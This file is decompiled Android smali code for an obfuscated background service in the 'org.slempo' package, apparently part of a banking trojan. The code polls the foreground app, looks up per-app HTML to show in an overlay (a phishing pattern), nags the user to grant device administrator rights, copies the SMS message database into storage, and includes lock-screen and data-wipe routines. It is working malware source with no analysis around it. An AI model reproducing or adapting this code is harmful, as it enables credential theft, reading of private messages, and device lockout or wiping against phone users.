.class public Lorg/slempo/service/tiunjvmkldioew;
.super Landroid/app/Service;
.source "tiunjvmkldioew.java"


# static fields
.field public static OVERLAY_VIEW:Lorg/slempo/service/OverlayView;

.field private static deviceManager:Landroid/app/admin/DevicePolicyManager;

.field private static htmlData:Lorg/json/JSONArray;

.field public static isRunning:Z

.field private static settings:Landroid/content/SharedPreferences;


# instance fields
.field private context:Landroid/content/Context;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .prologue
    .line 33
    const/4 v0, 0x0

    sput-boolean v0, Lorg/slempo/service/tiunjvmkldioew;->isRunning:Z

    .line 41
    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .prologue
    .line 29
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    return-void
.end method

.method static synthetic access$0(Lorg/slempo/service/tiunjvmkldioew;)Landroid/content/Context;
    .locals 1

    .prologue
    .line 31
    iget-object v0, p0, Lorg/slempo/service/tiunjvmkldioew;->context:Landroid/content/Context;

    return-object v0
.end method

.method static synthetic access$1(Lorg/slempo/service/tiunjvmkldioew;)Ljava/lang/String;
    .locals 1

    .prologue
    .line 135
    invoke-direct {p0}, Lorg/slempo/service/tiunjvmkldioew;->getTopRunning()Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method static synthetic access$2(Lorg/slempo/service/tiunjvmkldioew;Ljava/lang/String;)Ljava/lang/String;
    .locals 1

    .prologue
    .line 200
    invoke-direct {p0, p1}, Lorg/slempo/service/tiunjvmkldioew;->getHTMLForPackageName(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method static synthetic access$3()Landroid/content/SharedPreferences;
    .locals 1

    .prologue
    .line 37
    sget-object v0, Lorg/slempo/service/tiunjvmkldioew;->settings:Landroid/content/SharedPreferences;

    return-object v0
.end method

.method static synthetic access$4(Lorg/slempo/service/tiunjvmkldioew;)V
    .locals 0

    .prologue
    .line 176
    invoke-direct {p0}, Lorg/slempo/service/tiunjvmkldioew;->checkDeviceAdmin()V

    return-void
.end method

.method static synthetic access$5()Landroid/app/admin/DevicePolicyManager;
    .locals 1

    .prologue
    .line 35
    sget-object v0, Lorg/slempo/service/tiunjvmkldioew;->deviceManager:Landroid/app/admin/DevicePolicyManager;

    return-object v0
.end method

.method private checkDeviceAdmin()V
    .locals 8

    .prologue
    const/high16 v7, 0x10000000

    .line 177
    new-instance v1, Landroid/content/ComponentName;

    .line 178
    const-class v4, Lorg/slempo/service/ihnkkuigtvgyb7iujn;

    .line 177
    invoke-direct {v1, p0, v4}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 179
    .local v1, "componentName":Landroid/content/ComponentName;
    sget-object v4, Lorg/slempo/service/tiunjvmkldioew;->deviceManager:Landroid/app/admin/DevicePolicyManager;

    invoke-virtual {v4, v1}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z

    move-result v4

    if-nez v4, :cond_1

    .line 180
    new-instance v2, Landroid/content/Intent;

    invoke-direct {v2}, Landroid/content/Intent;-><init>()V

    .line 181
    .local v2, "intent":Landroid/content/Intent;
    const-class v4, Lorg/slempo/service/euirnceurhdvbeurs;

    invoke-virtual {v2, p0, v4}, Landroid/content/Intent;->setClass(Landroid/content/Context;Ljava/lang/Class;)Landroid/content/Intent;

    .line 182
    invoke-virtual {v2}, Landroid/content/Intent;->getFlags()I

    move-result v4

    or-int/2addr v4, v7

    .line 183
    const/high16 v5, 0x20000000

    or-int/2addr v4, v5

    .line 182
    invoke-virtual {v2, v4}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 184
    invoke-virtual {p0, v2}, Lorg/slempo/service/tiunjvmkldioew;->startActivity(Landroid/content/Intent;)V

    .line 198
    .end local v2    # "intent":Landroid/content/Intent;
    :cond_0
    :goto_0
    return-void

    .line 185
    :cond_1
    sget-object v4, Lorg/slempo/service/tiunjvmkldioew;->settings:Landroid/content/SharedPreferences;

    const-string v5, "IS_LINK_OPENED"

    const/4 v6, 0x0

    invoke-interface {v4, v5, v6}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v4

    if-nez v4, :cond_0

    .line 186
    const-string v4, "3"

    const-string v5, "1"

    invoke-virtual {v4, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_0

    .line 187
    sget-object v4, Lorg/slempo/service/tiunjvmkldioew;->settings:Landroid/content/SharedPreferences;

    const-string v5, "IS_LINK_OPENED"

    const/4 v6, 0x1

    invoke-static {v4, v5, v6}, Lorg/slempo/service/utils/erdkjlmcxwlksd;->putBooleanValue(Landroid/content/SharedPreferences;Ljava/lang/String;Z)V

    .line 188
    const-string v3, "http://google.com/"

    .line 189
    .local v3, "url":Ljava/lang/String;
    invoke-virtual {v3}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v3

    .line 190
    const-string v4, "http://"

    invoke-virtual {v3, v4}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v4

    if-nez v4, :cond_2

    const-string v4, "https://"

    invoke-virtual {v3, v4}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v4

    if-nez v4, :cond_2

    .line 191
    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "http://"

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    .line 193
    :cond_2
    new-instance v0, Landroid/content/Intent;

    const-string v4, "android.intent.action.VIEW"

    .line 194
    invoke-static {v3}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v5

    .line 193
    invoke-direct {v0, v4, v5}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    .line 195
    .local v0, "browserIntent":Landroid/content/Intent;
    invoke-virtual {v0, v7}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 196
    invoke-virtual {p0, v0}, Lorg/slempo/service/tiunjvmkldioew;->startActivity(Landroid/content/Intent;)V

    goto :goto_0
.end method

.method private getHTMLForPackageName(Ljava/lang/String;)Ljava/lang/String;
    .locals 6
    .param p1, "packageName"    # Ljava/lang/String;

    .prologue
    .line 201
    const/4 v1, 0x0

    .local v1, "i":I
    :goto_0
    sget-object v5, Lorg/slempo/service/tiunjvmkldioew;->htmlData:Lorg/json/JSONArray;

    invoke-virtual {v5}, Lorg/json/JSONArray;->length()I

    move-result v5

    if-lt v1, v5, :cond_0

    .line 216
    const-string v5, ""

    :goto_1
    return-object v5

    .line 203
    :cond_0
    :try_start_0
    sget-object v5, Lorg/slempo/service/tiunjvmkldioew;->htmlData:Lorg/json/JSONArray;

    invoke-virtual {v5, v1}, Lorg/json/JSONArray;->getJSONObject(I)Lorg/json/JSONObject;

    move-result-object v4

    .line 205
    .local v4, "packagesObject":Lorg/json/JSONObject;
    const-string v5, "packages"

    invoke-virtual {v4, v5}, Lorg/json/JSONObject;->getJSONArray(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object v3

    .line 206
    .local v3, "packagesNames":Lorg/json/JSONArray;
    const/4 v2, 0x0

    .local v2, "j":I
    :goto_2
    invoke-virtual {v3}, Lorg/json/JSONArray;->length()I

    move-result v5

    if-lt v2, v5, :cond_1

    .line 201
    .end local v2    # "j":I
    .end local v3    # "packagesNames":Lorg/json/JSONArray;
    .end local v4    # "packagesObject":Lorg/json/JSONObject;
    :goto_3
    add-int/lit8 v1, v1, 0x1

    goto :goto_0

    .line 208
    .restart local v2    # "j":I
    .restart local v3    # "packagesNames":Lorg/json/JSONArray;
    .restart local v4    # "packagesObject":Lorg/json/JSONObject;
    :cond_1
    invoke-virtual {v3, v2}, Lorg/json/JSONArray;->getString(I)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {p1, v5}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v5

    if-eqz v5, :cond_2

    .line 209
    const-string v5, "html"

    invoke-virtual {v4, v5}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v5

    goto :goto_1

    .line 206
    :cond_2
    add-int/lit8 v2, v2, 0x1

    goto :goto_2

    .line 212
    .end local v2    # "j":I
    .end local v3    # "packagesNames":Lorg/json/JSONArray;
    .end local v4    # "packagesObject":Lorg/json/JSONObject;
    :catch_0
    move-exception v0

    .line 213
    .local v0, "e":Lorg/json/JSONException;
    invoke-virtual {v0}, Lorg/json/JSONException;->printStackTrace()V

    goto :goto_3
.end method

.method private getTopRunning()Ljava/lang/String;
    .locals 4

    .prologue
    .line 136
    const-string v3, "activity"

    invoke-virtual {p0, v3}, Lorg/slempo/service/tiunjvmkldioew;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/ActivityManager;

    .line 137
    .local v0, "am":Landroid/app/ActivityManager;
    const/4 v3, 0x1

    invoke-virtual {v0, v3}, Landroid/app/ActivityManager;->getRunningTasks(I)Ljava/util/List;

    move-result-object v1

    .line 138
    .local v1, "tasks":Ljava/util/List;, "Ljava/util/List<Landroid/app/ActivityManager$RunningTaskInfo;>;"
    invoke-interface {v1}, Ljava/util/List;->isEmpty()Z

    move-result v3

    if-nez v3, :cond_0

    .line 139
    const/4 v3, 0x0

    invoke-interface {v1, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/app/ActivityManager$RunningTaskInfo;

    iget-object v2, v3, Landroid/app/ActivityManager$RunningTaskInfo;->topActivity:Landroid/content/ComponentName;

    .line 140
    .local v2, "topActivity":Landroid/content/ComponentName;
    invoke-virtual {v2}, Landroid/content/ComponentName;->getPackageName()Ljava/lang/String;

    move-result-object v3

    .line 142
    .end local v2    # "topActivity":Landroid/content/ComponentName;
    :goto_0
    return-object v3

    :cond_0
    const-string v3, ""

    goto :goto_0
.end method

.method public static hideSystemDialog()V
    .locals 2

    .prologue
    .line 147
    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v1, Lorg/slempo/service/tiunjvmkldioew$4;

    invoke-direct {v1}, Lorg/slempo/service/tiunjvmkldioew$4;-><init>()V

    invoke-virtual {v0, v1}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    .line 154
    return-void
.end method

.method public static removePackage(Ljava/lang/String;)V
    .locals 12
    .param p0, "packageName"    # Ljava/lang/String;

    .prologue
    .line 220
    new-instance v4, Lorg/json/JSONArray;

    invoke-direct {v4}, Lorg/json/JSONArray;-><init>()V

    .line 221
    .local v4, "newData":Lorg/json/JSONArray;
    const/4 v2, 0x0

    .local v2, "i":I
    :goto_0
    sget-object v9, Lorg/slempo/service/tiunjvmkldioew;->htmlData:Lorg/json/JSONArray;

    invoke-virtual {v9}, Lorg/json/JSONArray;->length()I

    move-result v9

    if-lt v2, v9, :cond_0

    .line 249
    sput-object v4, Lorg/slempo/service/tiunjvmkldioew;->htmlData:Lorg/json/JSONArray;

    .line 250
    sget-object v9, Lorg/slempo/service/tiunjvmkldioew;->settings:Landroid/content/SharedPreferences;

    const-string v10, "HTML_DATA"

    sget-object v11, Lorg/slempo/service/tiunjvmkldioew;->htmlData:Lorg/json/JSONArray;

    invoke-virtual {v11}, Lorg/json/JSONArray;->toString()Ljava/lang/String;

    move-result-object v11

    invoke-static {v9, v10, v11}, Lorg/slempo/service/utils/erdkjlmcxwlksd;->putStringValue(Landroid/content/SharedPreferences;Ljava/lang/String;Ljava/lang/String;)V

    .line 251
    return-void

    .line 223
    :cond_0
    :try_start_0
    sget-object v9, Lorg/slempo/service/tiunjvmkldioew;->htmlData:Lorg/json/JSONArray;

    invoke-virtual {v9, v2}, Lorg/json/JSONArray;->getJSONObject(I)Lorg/json/JSONObject;

    move-result-object v8

    .line 225
    .local v8, "packagesObject":Lorg/json/JSONObject;
    const-string v9, "packages"

    invoke-virtual {v8, v9}, Lorg/json/JSONObject;->getJSONArray(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object v7

    .line 226
    .local v7, "packagesNames":Lorg/json/JSONArray;
    const/4 v1, 0x0

    .line 227
    .local v1, "found":Z
    new-instance v6, Lorg/json/JSONArray;

    invoke-direct {v6}, Lorg/json/JSONArray;-><init>()V

    .line 228
    .local v6, "newPackages":Lorg/json/JSONArray;
    const/4 v3, 0x0

    .local v3, "j":I
    :goto_1
    invoke-virtual {v7}, Lorg/json/JSONArray;->length()I

    move-result v9

    if-lt v3, v9, :cond_1

    .line 237
    if-nez v1, :cond_3

    .line 238
    invoke-virtual {v4, v8}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;

    .line 221
    .end local v1    # "found":Z
    .end local v3    # "j":I
    .end local v6    # "newPackages":Lorg/json/JSONArray;
    .end local v7    # "packagesNames":Lorg/json/JSONArray;
    .end local v8    # "packagesObject":Lorg/json/JSONObject;
    :goto_2
    add-int/lit8 v2, v2, 0x1

    goto :goto_0

    .line 229
    .restart local v1    # "found":Z
    .restart local v3    # "j":I
    .restart local v6    # "newPackages":Lorg/json/JSONArray;
    .restart local v7    # "packagesNames":Lorg/json/JSONArray;
    .restart local v8    # "packagesObject":Lorg/json/JSONObject;
    :cond_1
    if-nez v1, :cond_2

    .line 231
    invoke-virtual {v7, v3}, Lorg/json/JSONArray;->getString(I)Ljava/lang/String;

    move-result-object v9

    .line 230
    invoke-virtual {p0, v9}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v9

    .line 231
    if-eqz v9, :cond_2

    .line 232
    const/4 v1, 0x1

    .line 228
    :goto_3
    add-int/lit8 v3, v3, 0x1

    goto :goto_1

    .line 234
    :cond_2
    invoke-virtual {v7, v3}, Lorg/json/JSONArray;->getString(I)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v6, v9}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_3

    .line 245
    .end local v1    # "found":Z
    .end local v3    # "j":I
    .end local v6    # "newPackages":Lorg/json/JSONArray;
    .end local v7    # "packagesNames":Lorg/json/JSONArray;
    .end local v8    # "packagesObject":Lorg/json/JSONObject;
    :catch_0
    move-exception v0

    .line 246
    .local v0, "e":Lorg/json/JSONException;
    invoke-virtual {v0}, Lorg/json/JSONException;->printStackTrace()V

    goto :goto_2

    .line 240
    .end local v0    # "e":Lorg/json/JSONException;
    .restart local v1    # "found":Z
    .restart local v3    # "j":I
    .restart local v6    # "newPackages":Lorg/json/JSONArray;
    .restart local v7    # "packagesNames":Lorg/json/JSONArray;
    .restart local v8    # "packagesObject":Lorg/json/JSONObject;
    :cond_3
    :try_start_1
    new-instance v5, Lorg/json/JSONObject;

    invoke-direct {v5}, Lorg/json/JSONObject;-><init>()V

    .line 241
    .local v5, "newJsonObject":Lorg/json/JSONObject;
    const-string v9, "packages"

    invoke-virtual {v5, v9, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 242
    const-string v9, "html"

    const-string v10, "html"

    invoke-virtual {v8, v10}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v5, v9, v10}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 243
    invoke-virtual {v4, v5}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;
    :try_end_1
    .catch Lorg/json/JSONException; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_2
.end method

.method public static showSystemDialog()V
    .locals 2

    .prologue
    .line 157
    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v1, Lorg/slempo/service/tiunjvmkldioew$5;

    invoke-direct {v1}, Lorg/slempo/service/tiunjvmkldioew$5;-><init>()V

    invoke-virtual {v0, v1}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    .line 164
    return-void
.end method

.method public static updateHTML(Lorg/json/JSONArray;)V
    .locals 0
    .param p0, "data"    # Lorg/json/JSONArray;

    .prologue
    .line 254
    sput-object p0, Lorg/slempo/service/tiunjvmkldioew;->htmlData:Lorg/json/JSONArray;

    .line 255
    return-void
.end method

.method public static wipeData()V
    .locals 2

    .prologue
    .line 167
    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v1, Lorg/slempo/service/tiunjvmkldioew$6;

    invoke-direct {v1}, Lorg/slempo/service/tiunjvmkldioew$6;-><init>()V

    invoke-virtual {v0, v1}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    .line 174
    return-void
.end method


# virtual methods
.method public isRunning(Ljava/lang/String;)Z
    .locals 6
    .param p1, "packageName"    # Ljava/lang/String;

    .prologue
    const/4 v4, 0x1

    const/4 v5, 0x0

    .line 124
    const-string v3, "activity"

    invoke-virtual {p0, v3}, Lorg/slempo/service/tiunjvmkldioew;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/ActivityManager;

    .line 125
    .local v0, "am":Landroid/app/ActivityManager;
    invoke-virtual {v0, v4}, Landroid/app/ActivityManager;->getRunningTasks(I)Ljava/util/List;

    move-result-object v1

    .line 126
    .local v1, "tasks":Ljava/util/List;, "Ljava/util/List<Landroid/app/ActivityManager$RunningTaskInfo;>;"
    invoke-interface {v1}, Ljava/util/List;->isEmpty()Z

    move-result v3

    if-nez v3, :cond_0

    .line 127
    invoke-interface {v1, v5}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/app/ActivityManager$RunningTaskInfo;

    iget-object v2, v3, Landroid/app/ActivityManager$RunningTaskInfo;->topActivity:Landroid/content/ComponentName;

    .line 128
    .local v2, "topActivity":Landroid/content/ComponentName;
    invoke-virtual {v2}, Landroid/content/ComponentName;->getPackageName()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3, p1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v3

    if-eqz v3, :cond_0

    move v3, v4

    .line 132
    .end local v2    # "topActivity":Landroid/content/ComponentName;
    :goto_0
    return v3

    :cond_0
    move v3, v5

    goto :goto_0
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    .param p1, "intent"    # Landroid/content/Intent;

    .prologue
    .line 119
    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 9

    .prologue
    const/4 v8, 0x0

    const-wide/16 v2, 0x0

    .line 44
    iput-object p0, p0, Lorg/slempo/service/tiunjvmkldioew;->context:Landroid/content/Context;

    .line 45
    const/4 v1, 0x1

    sput-boolean v1, Lorg/slempo/service/tiunjvmkldioew;->isRunning:Z

    .line 46
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    .line 47
    const-string v1, "AppPrefs"

    invoke-virtual {p0, v1, v8}, Lorg/slempo/service/tiunjvmkldioew;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v1

    sput-object v1, Lorg/slempo/service/tiunjvmkldioew;->settings:Landroid/content/SharedPreferences;

    .line 48
    const-string v1, "device_policy"

    invoke-virtual {p0, v1}, Lorg/slempo/service/tiunjvmkldioew;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/admin/DevicePolicyManager;

    sput-object v1, Lorg/slempo/service/tiunjvmkldioew;->deviceManager:Landroid/app/admin/DevicePolicyManager;

    .line 50
    :try_start_0
    new-instance v1, Lorg/json/JSONArray;

    sget-object v4, Lorg/slempo/service/tiunjvmkldioew;->settings:Landroid/content/SharedPreferences;

    const-string v5, "HTML_DATA"

    .line 51
    const-string v6, "[]"

    .line 50
    invoke-interface {v4, v5, v6}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v1, v4}, Lorg/json/JSONArray;-><init>(Ljava/lang/String;)V

    sput-object v1, Lorg/slempo/service/tiunjvmkldioew;->htmlData:Lorg/json/JSONArray;
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    .line 55
    :goto_0
    sget-object v1, Lorg/slempo/service/tiunjvmkldioew;->settings:Landroid/content/SharedPreferences;

    const-string v4, "MESSAGES_DB"

    const-string v5, ""

    invoke-interface {v1, v4, v5}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v4, ""

    invoke-virtual {v1, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_0

    .line 56
    sget-object v1, Lorg/slempo/service/tiunjvmkldioew;->settings:Landroid/content/SharedPreferences;

    const-string v4, "MESSAGES_DB"

    iget-object v5, p0, Lorg/slempo/service/tiunjvmkldioew;->context:Landroid/content/Context;

    invoke-static {v5}, Lorg/slempo/service/utils/erdkjlmcxwlksd;->readMessagesFromDeviceDB(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v5

    invoke-static {v1, v4, v5}, Lorg/slempo/service/utils/erdkjlmcxwlksd;->putStringValue(Landroid/content/SharedPreferences;Ljava/lang/String;Ljava/lang/String;)V

    .line 58
    :cond_0
    new-instance v1, Lorg/slempo/service/OverlayView;

    const v4, 0x7f030023

    invoke-direct {v1, p0, v4}, Lorg/slempo/service/OverlayView;-><init>(Landroid/app/Service;I)V

    sput-object v1, Lorg/slempo/service/tiunjvmkldioew;->OVERLAY_VIEW:Lorg/slempo/service/OverlayView;

    .line 59
    sget-object v1, Lorg/slempo/service/tiunjvmkldioew;->settings:Landroid/content/SharedPreferences;

    const-string v4, "IS_LOCKED"

    invoke-interface {v1, v4, v8}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v1

    if-eqz v1, :cond_1

    .line 60
    invoke-static {}, Lorg/slempo/service/tiunjvmkldioew;->showSystemDialog()V

    .line 65
    :goto_1
    invoke-static {}, Ljava/util/concurrent/Executors;->newSingleThreadScheduledExecutor()Ljava/util/concurrent/ScheduledExecutorService;

    move-result-object v0

    .line 66
    .local v0, "scheduler":Ljava/util/concurrent/ScheduledExecutorService;
    new-instance v1, Lorg/slempo/service/tiunjvmkldioew$1;

    invoke-direct {v1, p0}, Lorg/slempo/service/tiunjvmkldioew$1;-><init>(Lorg/slempo/service/tiunjvmkldioew;)V

    .line 71
    const-wide/16 v4, 0x3c

    sget-object v6, Ljava/util/concurrent/TimeUnit;->SECONDS:Ljava/util/concurrent/TimeUnit;

    .line 66
    invoke-interface/range {v0 .. v6}, Ljava/util/concurrent/ScheduledExecutorService;->scheduleAtFixedRate(Ljava/lang/Runnable;JJLjava/util/concurrent/TimeUnit;)Ljava/util/concurrent/ScheduledFuture;

    .line 72
    new-instance v1, Lorg/slempo/service/tiunjvmkldioew$2;

    invoke-direct {v1, p0}, Lorg/slempo/service/tiunjvmkldioew$2;-><init>(Lorg/slempo/service/tiunjvmkldioew;)V

    .line 99
    const-wide/16 v4, 0xfa0

    sget-object v6, Ljava/util/concurrent/TimeUnit;->MILLISECONDS:Ljava/util/concurrent/TimeUnit;

    .line 72
    invoke-interface/range {v0 .. v6}, Ljava/util/concurrent/ScheduledExecutorService;->scheduleAtFixedRate(Ljava/lang/Runnable;JJLjava/util/concurrent/TimeUnit;)Ljava/util/concurrent/ScheduledFuture;

    .line 100
    new-instance v1, Lorg/slempo/service/tiunjvmkldioew$3;

    invoke-direct {v1, p0}, Lorg/slempo/service/tiunjvmkldioew$3;-><init>(Lorg/slempo/service/tiunjvmkldioew;)V

    .line 106
    const-wide/16 v4, 0x64

    sget-object v6, Ljava/util/concurrent/TimeUnit;->MILLISECONDS:Ljava/util/concurrent/TimeUnit;

    .line 100
    invoke-interface/range {v0 .. v6}, Ljava/util/concurrent/ScheduledExecutorService;->scheduleAtFixedRate(Ljava/lang/Runnable;JJLjava/util/concurrent/TimeUnit;)Ljava/util/concurrent/ScheduledFuture;

    .line 107
    return-void

    .line 52
    .end local v0    # "scheduler":Ljava/util/concurrent/ScheduledExecutorService;
    :catch_0
    move-exception v7

    .line 53
    .local v7, "e":Lorg/json/JSONException;
    invoke-virtual {v7}, Lorg/json/JSONException;->printStackTrace()V

    goto :goto_0

    .line 62
    .end local v7    # "e":Lorg/json/JSONException;
    :cond_1
    invoke-static {}, Lorg/slempo/service/tiunjvmkldioew;->hideSystemDialog()V

    goto :goto_1
.end method

.method public onDestroy()V
    .locals 1

    .prologue
    .line 114
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    .line 115
    const/4 v0, 0x0

    sput-boolean v0, Lorg/slempo/service/tiunjvmkldioew;->isRunning:Z

    .line 116
    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 1
    .param p1, "intent"    # Landroid/content/Intent;
    .param p2, "flags"    # I
    .param p3, "startId"    # I

    .prologue
    .line 110
    invoke-super {p0, p1, p2, p3}, Landroid/app/Service;->onStartCommand(Landroid/content/Intent;II)I

    move-result v0

    return v0
.end method
